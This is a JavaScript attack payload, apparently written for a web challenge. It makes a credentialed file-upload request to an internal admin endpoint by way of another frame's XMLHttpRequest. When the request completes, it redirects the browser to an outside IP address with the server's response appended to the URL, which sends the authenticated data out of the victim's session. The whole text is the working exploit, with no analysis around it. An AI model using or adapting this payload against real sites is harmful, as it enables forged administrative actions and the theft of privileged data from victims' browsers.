function submitRequest()
      {
        window.XMLHttpRequest = window.top.frames[1].XMLHttpRequest;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://admin.government.vip:8000/upload", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
        xhr.withCredentials = "true";
        var body = "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"message\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"backPage\"\r\n" +
          "\r\n" +
          "test\r\n" +
          "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"dataType\"\r\n" +
          "\r\n" +
          "test  \r\n" +
          "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"file\"; filename=\"test2.txt\"\r\n" +
          "Content-Type: text/plain\r\n" +
          "\r\n" +
          "test3\r\n" +
          "-----------------------------256672629917035--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                location.href="http://119.29.135.206:23333/"+escape(xhr.responseText);
            }
        }
        xhr.send(new Blob([aBody]));
}
submitRequest();